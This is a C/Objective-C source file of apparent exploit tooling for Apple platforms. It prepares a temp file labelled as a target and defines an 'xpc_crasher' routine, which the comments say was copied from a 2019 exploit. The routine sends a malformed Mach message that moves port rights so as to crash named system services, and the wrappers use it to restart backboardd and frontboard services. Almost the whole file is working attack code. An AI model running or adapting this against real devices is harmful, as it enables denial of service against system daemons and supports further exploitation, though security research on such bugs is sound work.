#import <Foundation/Foundation.h>
#include <string.h>
#include <mach/mach.h>
#include <dirent.h>

char* get_temp_file_path(void) {
  return strdup([[NSTemporaryDirectory() stringByAppendingPathComponent:@"AAAAs"] fileSystemRepresentation]);
}

// create a read-only test file we can target:
char* set_up_tmp_file(void) {
  char* path = get_temp_file_path();
  printf("path: %s\n", path);
  
  FILE* f = fopen(path, "w");
  if (!f) {
    printf("opening the tmp file failed...\n");
    return NULL;
  }
  char* buf = malloc(PAGE_SIZE*10);
  memset(buf, 'A', PAGE_SIZE*10);
  fwrite(buf, PAGE_SIZE*10, 1, f);
  //fclose(f);
  return path;
}

kern_return_t
bootstrap_look_up(mach_port_t bp, const char* service_name, mach_port_t *sp);

struct xpc_w00t {
  mach_msg_header_t hdr;
  mach_msg_body_t body;
  mach_msg_port_descriptor_t client_port;
  mach_msg_port_descriptor_t reply_port;
};

mach_port_t get_send_once(mach_port_t recv) {
  mach_port_t so = MACH_PORT_NULL;
  mach_msg_type_name_t type = 0;
  kern_return_t err = mach_port_extract_right(mach_task_self(), recv, MACH_MSG_TYPE_MAKE_SEND_ONCE, &so, &type);
  if (err != KERN_SUCCESS) {
    printf("port right extraction failed: %s\n", mach_error_string(err));
    return MACH_PORT_NULL;
  }
  printf("made so: 0x%x from recv: 0x%x\n", so, recv);
  return so;
}

// copy-pasted from an exploit I wrote in 2019...
// still works...

// (in the exploit for this: https://googleprojectzero.blogspot.com/2019/04/splitting-atoms-in-xnu.html )

void xpc_crasher(char* service_name) {
  mach_port_t client_port = MACH_PORT_NULL;
  mach_port_t reply_port = MACH_PORT_NULL;

  mach_port_t service_port = MACH_PORT_NULL;

  kern_return_t err = bootstrap_look_up(bootstrap_port, service_name, &service_port);
  if(err != KERN_SUCCESS){
    printf("unable to look up %s\n", service_name);
    return;
  }

  if (service_port == MACH_PORT_NULL) {
    printf("bad service port\n");
    return;
  }

  // allocate the client and reply port:
  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &client_port);
  if (err != KERN_SUCCESS) {
    printf("port allocation failed: %s\n", mach_error_string(err));
    return;
  }

  mach_port_t so0 = get_send_once(client_port);
  mach_port_t so1 = get_send_once(client_port);

  // insert a send so we maintain the ability to send to this port
  err = mach_port_insert_right(mach_task_self(), client_port, client_port, MACH_MSG_TYPE_MAKE_SEND);
  if (err != KERN_SUCCESS) {
    printf("port right insertion failed: %s\n", mach_error_string(err));
    return;
  }

  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &reply_port);
  if (err != KERN_SUCCESS) {
    printf("port allocation failed: %s\n", mach_error_string(err));
    return;
  }

  struct xpc_w00t msg;
  memset(&msg.hdr, 0, sizeof(msg));
  msg.hdr.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, 0, 0, MACH_MSGH_BITS_COMPLEX);
  msg.hdr.msgh_size = sizeof(msg);
  msg.hdr.msgh_remote_port = service_port;
  msg.hdr.msgh_id   = 'w00t';

  msg.body.msgh_descriptor_count = 2;

  msg.client_port.name        = client_port;
  msg.client_port.disposition = MACH_MSG_TYPE_MOVE_RECEIVE; // we still keep the send
  msg.client_port.type        = MACH_MSG_PORT_DESCRIPTOR;

  msg.reply_port.name        = reply_port;
  msg.reply_port.disposition = MACH_MSG_TYPE_MAKE_SEND;
  msg.reply_port.type        = MACH_MSG_PORT_DESCRIPTOR;

  err = mach_msg(&msg.hdr,
                 MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                 msg.hdr.msgh_size,
                 0,
                 MACH_PORT_NULL,
                 MACH_MSG_TIMEOUT_NONE,
                 MACH_PORT_NULL);

  if (err != KERN_SUCCESS) {
    printf("w00t message send failed: %s\n", mach_error_string(err));
    return;
  } else {
    printf("sent xpc w00t message\n");
  }

  mach_port_deallocate(mach_task_self(), so0);
  mach_port_deallocate(mach_task_self(), so1);

  return;
}

void restartBackboard(void) {
  xpc_crasher("com.apple.backboard.TouchDeliveryPolicyServer");
}

void restartFrontboard(void) {
  // NOTE: This will not kill your app on some versions
  // You may also need to exit(0) afterwards
  xpc_crasher("com.apple.frontboard.systemappservices");
}
